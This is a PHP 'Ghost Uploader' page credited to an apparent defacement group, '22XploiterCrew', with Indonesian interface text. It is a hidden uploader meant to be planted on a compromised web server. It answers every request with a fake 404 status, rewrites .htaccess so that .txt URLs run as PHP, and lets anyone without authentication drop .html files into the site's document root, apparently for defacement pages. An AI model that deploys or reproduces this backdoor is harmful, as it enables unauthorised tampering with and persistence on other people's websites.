<?php
/**
* Mini Uploader
*
* Manipulasi uploader kamu dengan hanya mengganti ekstensi .php menjai .txt yang ada di url
*/
$RootDocument = $_SERVER['DOCUMENT_ROOT'];
$FileName = $_FILES['randsx']['name'];
$PathFile = "$RootDocument/$FileName";
$FileType = pathinfo($FileName, PATHINFO_EXTENSION);
http_response_code(404);
$Server = ((stristr($_SERVER['SERVER_PROTOCOL'], 'http')) ? 'http://' : 'https://').$_SERVER['SERVER_NAME'].((empty($_SERVER['SERVER_PORT'])) ? '' : ':'.$_SERVER['SERVER_PORT']).'/';
$Ht = "RewriteEngine On\nRewriteRule ^(.*)\.txt$ $1.php [nc]";
file_put_contents('.htaccess', $Ht);
?>
<!doctype html>
<html lang="en">
<head>
	<!-- Required meta tags | Rek0d bilang mamank:( -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="author" content="22XploiterCrew">

	<!-- Bootstrap CSS -->
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous" data-t="RandsX">
	<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
	<title>Ghost Uploader</title>
	<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
</head>
<body>
	<h3 class="text-center mt-2" style="font-family:'Press Start 2P';">Ghost Uploader</h3>
	<div class="p-3" id="apps">
		<img src="https://images2.imgbox.com/4b/a9/IXsoeFFp_o.png" width="300" class="mx-auto d-block" style="clip-path: polygon(0 0, 100% 0, 100% 89%, 0 63%);">
		<form method="post" enctype="multipart/form-data">
			<div class="row">
				<div class="col">
					<input placeholder="File" class="form-control bg-transparent text-lime filepath" readonly="readonly">
				</div>

				<div class="col">
					<div class="input-group mb-3">
						<div class="custom-file">
							<input type="file" name="randsx" class="custom-file-input bg-transparent file" id="previews">
							<label class="custom-file-label bg-transparent" for="previews"></label>
						</div>
					</div>
				</div>
			</div>
			<div class="form-group">
				<button type="submit" class="btn btn-secondary btn-block" name="upload">Upload</button>
			</div>
		</form>
		<center><small>22XploiterCrew</small></center>

		<?php
		if (isset($_POST['upload'])) {
			if ($FileName !== '' || is_null($FileName)) {
				if (is_writable($RootDocument) || is_readable($RootDocument)) {
					if ($FileType === 'html') {
						//
						if (!stristr($FileName, 'index')) {
							$upload = move_uploaded_file($_FILES['randsx']['tmp_name'], $PathFile);
							if ($upload) {
								echo "<script>swal({
			            title: 'Berhasil upload',
			            text: 'Anda akan dialihkan dalam 3 detik',
			            icon: 'success',
			            timer: 3000,
			            button: false
			          }).then(function() {
			            window.location.href = '$Server/$FileName';
			          });</script>";
							} else {
								echo '<script>swal("Gagal upload file","Silahkan coba lagi.","error")</script>';
							}
						} else {
							echo '<script>swal("Gagal upload file","File yang diupload tidak boleh index file.","error")</script>';
						}
					} else {
						echo '<script>swal("Gagal upload file","File yang diupload harus berekstensi .html","error")</script>';
					}
				} else {
					echo '<script>swal("Gagal upload file","Root document tidak bisa dibaca","error")</script>';
				}
			} else {
				echo '<script>swal("","Anda belum memilih file!","warning")</script>';
			}
		}
		?>
	</div>

	<!-- Optional JavaScript -->
	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
	<script>
		$('.file').on('change', function() {
			fullPath = $(this).val();
			if (fullPath) {
				var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\'): fullPath.lastIndexOf('/'));
				var filename = fullPath.substring(startIndex);
				if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
					filename = filename.substring(1);
				}
				$('.filepath').val(filename);
			}
		});
		$('.btn').on('click', function() {
			$(this).html('Loading...');
		})
	</script>
</body>
</html>
